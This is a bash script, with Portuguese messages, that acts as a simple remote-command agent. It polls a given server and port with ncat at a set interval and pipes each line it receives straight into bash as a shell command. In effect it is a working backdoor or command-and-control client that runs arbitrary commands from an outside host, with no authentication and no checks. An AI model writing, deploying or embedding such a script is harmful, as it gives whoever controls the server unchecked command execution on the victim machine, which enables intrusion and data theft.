#!/bin/bash

while getopts "s:p:t:" opt; do
    case $opt in
        p)PORT=$OPTARG; echo "[*] Porta definida: $OPTARG";;
        s)SERVER=$OPTARG; echo "[*] Servidor definido: $OPTARG";;
        t)DELAY=$OPTARG; echo "[*] Intervalo definido: $OPTARG";;
        ?)echo "Unknown argument: $OPTARG"; exit 1;;
    esac
done

if [[ $# < 4 ]]; then
    echo "Uso: $0 -s IP -p PORTA -t INTERVALO"
    exit 1;
fi

which ncat > /dev/null 2>&1
if [[ $? != 0 ]]; then
    echo "ncat nao instalado. Instale o nmap.";
    exit 1;
fi

connect()
{
    data=$(ncat $SERVER $PORT --recv-only 2>/dev/null);
    if [[ $? != 0 ]]; then
        echo "[!] Servidor sem resposta ou comandos";
        return 0;
    fi
    lines=();
    while read -r line; do
        lines+=($line);
    done <<< ${data}
    for l in ${lines[@]}; do
        if [[ $l == "EOF" ]]; then
            return 0;
        fi
        cmd=$(echo $l | tr "_" " ");
        echo "Executing '$cmd' ..."
        echo $cmd | bash  # execute every command to the shell
    done
    return 0;
}


while [ 1 -eq 1 ]; do
    connect;
    sleep $DELAY
done
